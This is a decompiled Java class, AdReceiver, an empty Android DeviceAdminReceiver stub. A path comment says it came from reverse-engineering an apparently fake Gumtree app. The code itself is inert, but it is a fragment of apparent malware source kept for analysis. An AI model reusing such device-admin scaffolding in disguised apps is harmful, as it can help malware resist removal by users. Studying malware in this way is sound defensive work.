package com.gumsis.rcs;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdReceiver
  extends DeviceAdminReceiver
{
  public void onDisabled(Context paramContext, Intent paramIntent) {}
  
  public void onEnabled(Context paramContext, Intent paramIntent) {}
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    super.onReceive(paramContext, paramIntent);
  }
}


/* Location:              /home/cmd/Programmierung/Android/reverse-engineering/fakegumtree/FakeGumtree-dex2jar.jar!/com/gumsis/rcs/AdReceiver.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */